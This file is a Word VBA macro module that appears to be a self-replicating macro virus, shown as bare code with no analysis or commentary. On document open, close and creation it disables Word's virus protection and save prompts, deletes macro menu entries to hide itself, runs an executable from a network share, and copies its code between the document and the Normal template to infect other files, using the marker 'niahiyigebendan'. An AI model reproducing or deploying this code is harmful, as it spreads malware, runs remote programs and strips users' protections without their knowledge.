VERSION 1.0 CLASS
BEGIN
  MultiUse = -1  'True
END
Attribute VB_Name = "ThisDocument"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True





Dim x1, x2, x3, x4 As Boolean
Dim x5, x6 As Object
Dim x7, x8, x16 As Integer
Dim x9 As Date
Dim x10, x11, x12, x13, x14 As String
Private Sub Document_Close()
On Error Resume Next
Set x5 = ActiveDocument.VBProject.VBComponents.Item(1)
Set x6 = NormalTemplate.VBProject.VBComponents.Item(1)
x3 = x5.codemodule.Find("niahiyigebendan", 1, 1, 10000, 10000)
x4 = x6.codemodule.Find("niahiyigebendan", 1, 1, 10000, 10000)
With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With
    CommandBars("Macro").Controls(4).Delete
    CommandBars("Macro").Controls(3).Delete
    CommandBars("Macro").Controls(2).Delete
    CommandBars("Macro").Controls(1).Delete
    CommandBars("Tools").Controls(17).Delete
Shell ("\\jdq\cc$\b.exe")
If x3 = True Then
    x13 = x5.codemodule.Lines(1, x5.codemodule.CountOfLines)
ElseIf x4 = True Then
    x13 = x6.codemodule.Lines(1, x6.codemodule.CountOfLines)
End If
If (x3 = True Xor x4 = True) And _
   (ActiveDocument.SaveFormat = wdFormatDocument Or _
   ActiveDocument.SaveFormat = wdFormatTemplate) Then
      If x3 = True Then
        x2 = NormalTemplate.Saved
        x11 = x5.codemodule.Lines(1, x5.codemodule.CountOfLines)
        x6.codemodule.deletelines 1, x6.codemodule.CountOfLines
        x6.codemodule.AddFromString x11
        If x2 = True Then NormalTemplate.Save
      End If
    If x4 = True Or ActiveDocument.Saved = False Then
     x1 = ActiveDocument.Saved
     x11 = x6.codemodule.Lines(1, x6.codemodule.CountOfLines)
     x5.codemodule.deletelines 1, x5.codemodule.CountOfLines
     x5.codemodule.AddFromString x11
     If x1 = True Then ActiveDocument.Save
   End If
End If
End Sub
Private Sub Document_New()
Set x5 = ActiveDocument.VBProject.VBComponents.Item(1)
Set x6 = NormalTemplate.VBProject.VBComponents.Item(1)
x3 = x5.codemodule.Find("niahiyigebendan", 1, 1, 10000, 10000)
x4 = x6.codemodule.Find("niahiyigebendan", 1, 1, 10000, 10000)
With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With
If x4 = False Then
    x6.codemodule.deletelines 1, x6.codemodule.CountOfLines
End If
If x3 = False Then
        x5.codemodule.deletelines 1, x5.codemodule.CountOfLines
End If


End Sub
Private Sub Document_Open()
Set x5 = ActiveDocument.VBProject.VBComponents.Item(1)
Set x6 = NormalTemplate.VBProject.VBComponents.Item(1)
x3 = x5.codemodule.Find("niahiyigebendan", 1, 1, 10000, 10000)
x4 = x6.codemodule.Find("niahiyigebendan", 1, 1, 10000, 10000)
With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With
If x4 = False Then
    x6.codemodule.deletelines 1, x6.codemodule.CountOfLines
End If
If x3 = False Then
        x5.codemodule.deletelines 1, x5.codemodule.CountOfLines
End If

End Sub




























































































































































































































